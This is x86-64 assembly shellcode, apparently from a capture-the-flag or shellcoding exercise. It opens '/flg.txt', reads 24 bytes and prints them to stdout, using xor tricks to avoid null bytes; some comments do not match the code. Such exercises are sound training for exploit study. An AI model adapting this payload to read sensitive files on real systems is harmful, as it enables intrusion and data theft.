global _start

section .text
_start:
    ; push './flg.txt\x00'
    xor rdx, rdx
    push rdx              ; push NULL string terminator
    mov rdi, '/flg.txt' ; rest of file name
    push rdi            ; push to stack

    ; open('rsp', 'O_RDONLY')
    mov al, 2          ; open syscall number
    mov rdi, rsp        ; move pointer to filename
    xor rsi, rsi         ; set O_RDONLY flag
    syscall

    ; read file
    lea rsi, [rdi]      ; pointer to opened file
    mov rdi, rax        ; set fd to rax from open syscall
    xor rax, rax          ; read syscall number
    xor rdx, rdx
    mov dl, 24         ; size to read
    syscall

    ; write output
    xor rax, rax
    mov al, 1          ; write syscall
    xor rdi, rdi
    mov dil, 1          ; set fd to stdout
    xor rdx, rdx
    mov dl, 24         ; size to read
    syscall

    ; exit
    xor rax, rax
    mov al, 60
    xor dil, dil
    syscall

